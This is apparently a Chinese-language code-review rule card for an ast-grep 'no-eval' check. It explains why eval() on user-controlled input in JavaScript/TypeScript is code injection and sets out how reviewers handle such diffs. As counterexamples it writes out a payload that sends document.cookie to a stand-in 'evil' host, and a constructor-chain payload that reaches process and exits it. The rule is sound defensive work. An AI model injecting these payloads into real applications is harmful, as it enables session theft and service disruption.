# 规则：eval 执行任意代码的注入面

**适用**：JavaScript/TypeScript 中调用 `eval()` 的代码（`*.js`、`*.jsx`、
`*.ts`、`*.tsx` 命中本规则）。

**判据**：`eval()` 将传入的字符串作为代码在当前作用域执行。这意味着：
①能访问当前作用域的所有局部变量与闭包；②输入若来自用户/外部数据源，
等同于**代码注入**——与 SQL 注入同级的安全缺陷。改动涉及 `eval` 调用时，
必须追踪 `eval` 参数的来源链，确认不含用户可控输入。

**反例形态**：`eval(request.body.expr)` 中 `expr` 来自 HTTP 请求体——
攻击者传入 `fetch('http://evil/'+document.cookie)` 即可窃取会话凭据。
即使参数是拼接字符串如 `eval("obj." + fieldName)`，`fieldName` 可控时
同样可注入 `obj.constructor.constructor("return process")().exit()`。

**评审动作**：对含 `eval` 调用的 diff，问一句"eval 的参数从哪来？经不经过
用户输入？有没有替代方案（如 `Function` 构造器 + 参数白名单、`JSON.parse`、
模板引擎）？"——不能排除用户输入就按高危驳回。

出处：ast-grep 引擎规则 no-eval（engines/astgrep_adapter.py BUILTIN_RULES，
round-40 规则集 v2 扩展；ast-grep MIT，模式 `eval($$$)`，severity=高）。
